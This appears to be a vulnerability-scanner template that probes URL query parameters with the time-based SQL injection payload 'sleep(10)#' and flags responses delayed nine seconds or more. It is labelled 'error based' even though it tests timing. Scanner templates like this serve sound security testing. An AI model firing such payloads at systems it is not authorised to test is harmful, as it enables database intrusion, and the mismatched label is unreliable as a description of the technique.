http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    part: query
    type: postfix
  matchers:
  - dsl:
    - duration>=9
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    injection:
    - sleep(10)#
  stop-at-first-match: true
id: sqli-error-based
info:
  author: geeknik,pdteam
  description: 'Direct SQL Command Injection is a technique where an attacker creates
    or alters existing SQL commands to expose hidden data,

    or to override valuable ones, or even to execute dangerous system level commands
    on the database host.

    This is accomplished by the application taking user input and combining it with
    static parameters to build an SQL query .

    '
  name: Error based SQL Injection
  severity: critical
  tags: sqli,error,dast
